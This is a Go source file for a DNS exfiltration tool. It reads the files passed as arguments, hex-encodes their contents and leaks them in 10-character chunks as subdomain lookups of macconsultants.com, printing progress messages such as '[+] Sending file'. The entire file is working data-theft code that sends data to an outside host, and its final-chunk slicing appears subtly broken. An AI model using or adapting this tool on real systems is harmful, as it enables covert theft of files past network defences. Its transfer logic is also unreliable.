package main

import (
	"context"
	"encoding/hex"
	"fmt"
	"net"
	"os"
	"time"
)

func main() {
	args := os.Args[1:]

	r := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			d := net.Dialer{
				Timeout: time.Millisecond * time.Duration(10000),
			}

			return d.DialContext(ctx, "udp", "127.0.0.1:53")
		},
	}

	for _, file := range args {

		if _, err := os.Stat(file); err != nil {
			fmt.Printf("error stating file : %s", err)

			continue
		}

		var (
			data []byte
			er   error
		)

		if data, er = os.ReadFile(file); er != nil {
			fmt.Printf("error reading file : %s", er)

			continue
		}

		fmt.Println("[+] Sending file " + file + " using hex encoding in the A record request...")
		encoded := hex.EncodeToString(data)
		initializer := 0
		length := len(encoded)
		for {
			if initializer == 0 {
				int1 := 10 * initializer
				int2 := 10 + int1
				sendme := encoded[int1:int2]
				length -= 10
				initializer += 1
				dom := sendme + ".macconsultants.com"
				r.LookupHost(context.Background(), dom)

			} else {
				int3 := 10 * initializer
				int4 := 10 + int3

				if length < 10 {
					sendmefinal := encoded[int3:(int4 - (length))]
					mydom := sendmefinal + ".macconsultants.com"
					r.LookupHost(context.Background(), mydom)
					fmt.Println("[+] File " + file + " successfully sent!")
					break
				}
				sendme2 := encoded[int3:int4]
				dom2 := sendme2 + ".macconsultants.com"
				r.LookupHost(context.Background(), dom2)
				length -= 10
				initializer += 1
			}
		}
	}
}
